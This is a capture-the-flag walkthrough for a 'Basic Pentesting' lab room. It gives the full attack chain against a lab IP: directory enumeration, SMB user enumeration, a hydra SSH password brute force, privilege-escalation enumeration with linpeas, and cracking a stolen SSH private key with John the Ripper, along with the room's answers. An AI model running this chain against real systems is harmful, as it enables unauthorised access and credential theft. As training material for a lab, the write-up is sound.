# Notes for the room "Basic Pentesting"

## Tasks 

### Task 1

What is the name of the hidden directory on the web server(enter name without /)?


Did a gobuster scan:
```
└─$ gobuster dir -u 10.10.57.76 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.57.76
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/05/28 04:17:42 Starting gobuster in directory enumeration mode
===============================================================
/development          (Status: 301) [Size: 316] [--> http://10.10.57.76/development/]
```

So the answer is:

```
development
```

What is the username?

First used enum4linux, command:

```
enum4linux -a 10.10.57.76 | tee enum4linux.txt
```

From there we got the users: 

```
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)
```

So the answer:

```
jan
```

What is the password?

So for the password we use hydra with this command:

```
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.57.76
```
NOTE: That from the nmap scan we could see that ssh was open so we specify ssh in hydra

The output:

```
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-28 04:46:19
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.57.76:22/
[STATUS] 179.00 tries/min, 179 tries in 00:01h, 14344223 to do in 1335:36h, 16 active
[STATUS] 128.67 tries/min, 386 tries in 00:03h, 14344016 to do in 1858:02h, 16 active
[22][ssh] host: 10.10.57.76   login: jan   password: armando
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-28 04:52:57
```

So the answer is:

```
armando
```
Enumerate the machine to find any vectors for privilege escalation

For this we are transfering `linpeas.sh` to the box:

```
scp linpeas.sh jan@10.10.57.76:/dev/shm
```

NOTE: Transfering to `/dev/shm` beacuse its shared memory and is allowed.

So from the `linpeas.sh` we saw that the user `kay` had a ssh private key:

```
[+] Looking for ssl/ssh files
/home/kay/.ssh/authorized_keys                                                                                                                                                          
/home/kay/.ssh/id_rsa
/home/kay/.ssh/id_rsa.pub
Port 22
PermitRootLogin prohibit-password
PubkeyAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no
UsePAM yes
Possible private SSH keys were found!
/home/kay/.ssh/id_rsa

``` 

So copied the content of the key and used JohnTheRipper to crack the ssh-key password:

```
┌──(kali㉿kali)-[~/THM/rooms/Basic_Pentesting]
└─$ python /usr/share/john/ssh2john.py id_rsa > id_rsa_hash.txt                                                                                                    130 ⨯
                                                                                                                                                                         
┌──(kali㉿kali)-[~/THM/rooms/Basic_Pentesting]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (id_rsa)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:03 DONE (2021-05-28 05:10) 0.2702g/s 3876Kp/s 3876Kc/s 3876KC/sa6_123..*7¡Vamos!
Session completed
```

Logged in with the password and used `cat` to get the content of the file `pass.bak` in the home folder:

```
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```